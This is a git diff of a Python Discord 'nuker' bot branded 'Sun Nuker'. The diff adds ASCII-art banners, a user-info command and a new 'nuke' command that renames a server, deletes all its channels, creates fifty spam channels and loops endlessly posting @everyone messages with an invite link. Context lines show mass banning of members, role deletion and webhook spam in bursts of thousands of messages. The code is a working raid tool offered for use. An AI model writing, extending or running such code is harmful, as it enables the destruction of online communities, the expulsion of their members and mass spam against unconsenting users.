@@ -1,34 +1,38 @@
-import sys, discord, requests, json, threading, random, asyncio,aiohttp, time, os
+import sys, discord, requests, json, threading, random, asyncio,aiohttp, time, os, socket, time
 from discord.ext import commands
 import colorama
 from colorama import Fore, Style, Back, Fore
 from termcolor import colored
 from time import sleep
 from datetime import datetime
+from pystyle import Colorate, Colors
 
-
-now = datetime.now()
-ftime = now.strftime("%H:%M:%S")
 
 session = requests.Session()
 
-print(f'''{Fore.YELLOW}
+login ="""
                           ██╗░░░░░░█████╗░░██████╗░░██████╗░██╗███╗░░██╗
                           ██║░░░░░██╔══██╗██╔════╝░██╔════╝░██║████╗░██║
                           ██║░░░░░██║░░██║██║░░██╗░██║░░██╗░██║██╔██╗██║
                           ██║░░░░░██║░░██║██║░░╚██╗██║░░╚██╗██║██║╚████║
                           ███████╗╚█████╔╝╚██████╔╝╚██████╔╝██║██║░╚███║
-                          ╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚═╝╚═╝░░╚══╝''')
+                          ╚══════╝░╚════╝░░╚═════╝░░╚═════╝░╚═╝╚═╝░░╚══╝
+"""
+
+print(Colorate.Vertical(Colors.yellow_to_red, login))
 print(f'''{Fore.WHITE}
                         ╭━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━┳━━╮
                         ╰━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━┻━━╯''')
 print('')
-print(f'''{Fore.YELLOW}
+tokenstyle = """
                                     ▀█▀ █▀█ █▄▀ █▀▀ █▄░█
-                                    ░█░ █▄█ █░█ ██▄ █░▀█''')
+                                    ░█░ █▄█ █░█ ██▄ █░▀█
+"""
+
+print(Colorate.Vertical(Colors.yellow_to_red, tokenstyle))
 print(f'''{Fore.WHITE}''')
 print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
-token = input("                           [?] Bot Token: ")
+token = input("                            [?] Bot Token: ")
 print(f'''{Fore.YELLOW}
                                     █▀█ █▀█ █▀▀ █▀▀ █ ▀▄▀
                                     █▀▀ █▀▄ ██▄ █▀░ █ █░█''')
@@ -60,18 +64,22 @@ print(f'''{Fore.WHITE}''')
 print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
 rol = input("                            [?] role name: ")
 print(f'''{Fore.YELLOW}
+                                        █▄░█ ▄▀█ █▀▄▀█ █▀▀
+                                        █░▀█ █▀█ █░▀░█ ██▄''')
+print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
+tag = input("                            [?] whats your discord tag?: ")
+print(f'''{Fore.YELLOW}
                                   █░█░█ █▀▀ █▄▄ █░█ █▀█ █▀█ █▄▀
-                                   ▀▄▀▄▀ ██▄ █▄█ █▀█ █▄█ █▄█ █░█''')
+                                  ▀▄▀▄▀ ██▄ █▄█ █▀█ █▄█ █▄█ █░█''')
 print(f'''{Fore.WHITE}''')
 print(f'''{Fore.WHITE}                            ──────────────────────────────────────''')
-webname = input("                           [?] Spam Webhook names: ")
+webname = input("                            [?] Spam Webhook names: ")
 amountss = 1000
 intents = discord.Intents().all()
 intents.messages = True
 bot = commands.Bot(command_prefix=prefix, intents=intents)
 bot.remove_command("help")
-
-# Clear the terminal screen
+print(f"{Fore.WHITE}")
 os.system('cls' if os.name == 'nt' else 'clear')
 
 
@@ -85,36 +93,47 @@ else:
     "Authorization": 
       token
   }
+  
 
 @bot.event
 async def on_ready():
     print('')
     await bot.change_presence(activity=discord.Game(stats))
     print(f"{Fore.LIGHTRED_EX}")
-    print('')  
     print(f"{Fore.YELLOW}")
-    print("""
-                ░██████╗██╗░░░██╗███╗░░██╗  ███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
-                ██╔════╝██║░░░██║████╗░██║  ████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
-                ╚█████╗░██║░░░██║██╔██╗██║  ██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
-                ░╚═══██╗██║░░░██║██║╚████║  ██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
-                ██████╔╝╚██████╔╝██║░╚███║  ██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
-                ╚═════╝░░╚═════╝░╚═╝░░╚══╝  ╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝""")
+sun = """
+                             ____                                __             
+                            / __/ __ __  ___        ___  __ __  / /__ ___   ____
+                            _\ \  / // / / _ \     / _ \/ // / /  '_// -_) / __/
+                           /___/  \_,_/ /_//_/    /_//_/\_,_/ /_/\_\ \__/ /_/   𝘷 1.1
+"""
+print(Colorate.Vertical(Colors.yellow_to_red, sun))
+def animated_print2(text, delay=0.1):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
+animated_print2(f"{Fore.WHITE}                                        ᴄᴏᴍᴍᴀɴᴅs ғᴏʀ ᴛʜᴇ ʙᴏᴛ  ")
+print(f'''{Fore.BLACK}''')
+blabla = """                                ╔══════════════════════════════════╗
+                                ║   [1] Nuke   ║   [5] scr         ║
+                                ║   [2] scc    ║   [6] spam        ║
+                                ║   [3] sdc    ║   [7] bm          ║
+                                ║   [4] sdr    ║   [9] end         ║
+                                ║   [8] swh    ║   [10] CN         ║
+                                ╚══════════════════════════════════╝"""
+print(Colorate.Vertical(Colors.yellow_to_red , blabla))
+print(f"{Fore.WHITE}                                         ᴘʀᴇғɪx - [{prefix}] ❘  ⲏⲓ - {tag} ")
+def animated_print(text, delay=0.1):
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(delay)
 
-    print(f"{Fore.WHITE}                                      ᴄᴏᴍᴍᴀɴᴅs ғᴏʀ ᴛʜᴇ ʙᴏᴛ  ")
-    print(f'{Fore.YELLOW}                                 ╔══════════════════════════════════╗')
-    print(f'{Fore.YELLOW}                                 ║' + f'{Fore.WHITE}   [1] Nuke   ║   [5] scr'+ f'{Fore.YELLOW}         ║')
-    print(f'{Fore.YELLOW}                                 ║' + f'{Fore.WHITE}   [2] scc    ║   [6] spam' + f'{Fore.YELLOW}        ║' )
-    print(f'{Fore.YELLOW}                                 ║' + f'{Fore.WHITE}   [3] sdc    ║   [7] bm' + f'{Fore.WHITE}          ║')
-    print(f'{Fore.YELLOW}                                 ║' + f'{Fore.WHITE}   [4] sdr    ║   [9] sd' + f'{Fore.WHITE}          ║')
-    print(f'{Fore.WHITE}                                 ║' + f'{Fore.WHITE}   [8] swh    ║   ' + f'{Fore.WHITE}                ║')
-    print(f'{Fore.WHITE}                                 ╚══════════════════════════════════╝')
-    print(f"{Fore.WHITE}" + f"                              ᴘʀᴇғɪx - [{prefix}] ❘ ʟᴏɢɢᴇᴅ ɪɴ ᴀs- {bot.user.name}")  
-    print(f"{Fore.WHITE}                                           ᴍᴀᴅᴇ ʙʏ ANONYMOUS                              ")
-  
-# ...
+animated_print("                                          ᴍᴀᴅᴇ ʙʏ ANONYMOUS")
 
-  
+
+
 
 @bot.command()
 async def scc(ctx):
@@ -134,6 +153,23 @@ async def scc(ctx):
              target=spc,
              args=(chan, )
            ).start()
+           
+@bot.command()
+async def nuke(ctx):
+    await ctx.message.delete()
+    await ctx.guild.edit(name="LAMOOO")
+
+    for channel in ctx.guild.channels:
+        await channel.delete()
+        print("Deleted {}".format(channel))
+
+    for i in range(50):
+        await ctx.guild.create_text_channel(f"SUNBOT")
+
+    for channel in ctx.guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            while True:
+                await channel.send("@everyone SUN BOT>>>>>>> https://discord.gg/fastly")
 
 @bot.command()
 async def scr(ctx):
@@ -161,7 +197,7 @@ async def sdr(ctx):
         await role.delete()
 
 @bot.command()
-async def nuke(ctx):
+async def Cn(ctx):
     await ctx.message.delete()
     guild = ctx.guild.id
     for channel in list(ctx.guild.channels):
@@ -212,7 +248,7 @@ async def swh(ctx):
 async def mb(ctx):
   try:
     for members in ctx.guild.members:
-      await members.ban(reason="Nuked By ANONYMOUS")
+      await members.ban(reason="Nuked By niko")
       print(Fore.GREEN + f"banned {members}")
   except:
     print(Fore.RED + f"cant ban {members}")
@@ -224,10 +260,27 @@ async def on_guild_channel_create(channel):
             for i in range(10000):   
                  await webhook.send(spamdata)
         except:
-            print("Ratelimited")
+            print("[!] Ratelimited :( ║")
             
 @bot.command()
-async def sd(ctx):
+async def info(ctx, user: discord.User):
+    user_info = f"""
+# ----------------------------------
+# Information about {user.name}
+# ----------------------------------
+**Username**: {user.name}
+**User ID**: {user.id}
+**Discriminator**: #{user.discriminator}
+**Bot Account?**: {user.bot}
+**Joined Discord On**: {user.created_at.strftime('%Y-%m-%d %H:%M:%S')}
+**Avatar URL**: [.]({user.avatar.url})
+
+Note: Server join date and some other info may not be available.
+"""
+    await ctx.send(user_info)
+            
+@bot.command()
+async def end(ctx):
     # Ask for confirmation in the terminal
     (f'''{Fore.WHITE}                 ─────────────────────────────────''')
     print(f'''{Fore.YELLOW}
@@ -238,14 +291,13 @@ async def sd(ctx):
     confirmation = input("[?] Aʀᴇ ʏᴏᴜ sᴜʀᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ sʜᴜᴛ ᴅᴏᴡɴ ᴛʜᴇ ʙᴏᴛ? (ʏ/ɴ): ").strip().lower()
     if confirmation == 'y':
         shutdown_message = await ctx.send("Bot is shutting down.")
-        await bot.close()  # Close the bot connection
-        await shutdown_message.delete()  # Delete the shutdown message
-        sys.exit()  # Exit the Python script
+        await bot.close() 
+        await shutdown_message.delete() 
+        sys.exit()  
     else:
         shutdown_cancel_message = await ctx.send("Shutdown canceled.")
-        await shutdown_cancel_message.delete()  # Delete the shutdown canceled message
+        await shutdown_cancel_message.delete() 
         
 
-
-
+        
 bot.run(token)
